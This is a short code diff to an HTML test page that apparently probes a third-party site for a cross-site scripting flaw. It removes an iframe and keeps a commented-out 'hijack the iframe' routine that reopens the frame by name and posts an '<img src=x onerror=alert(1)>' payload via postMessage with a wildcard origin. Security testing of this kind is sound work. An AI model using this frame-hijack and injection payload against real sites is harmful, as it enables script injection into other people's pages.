@@ -8,7 +8,6 @@
 <body>
     <h1>Test</h1>
     <button onclick="openNewTab()">Open New Tab</button>
-    <iframe name="myframe" src="https://www.files.com/slice-simulator" width="500" height="500"></iframe>
 
     <script>
         // Method 1: Open a new tab, then hijack the iframe by targeting its name
@@ -21,7 +20,7 @@
         //         let x = window.open("victim.html", "myframe");
 
         //         // 3. Wait for the hijacked iframe to load, then postMessage to it
-        //         setTimeout(function() {
+        //         setTimeout(function() { 
         //             // x.postMessage("badr", '*');
         //             x.postMessage("<img src=x onerror=alert(1)>", '*');
         //         }, 2000);
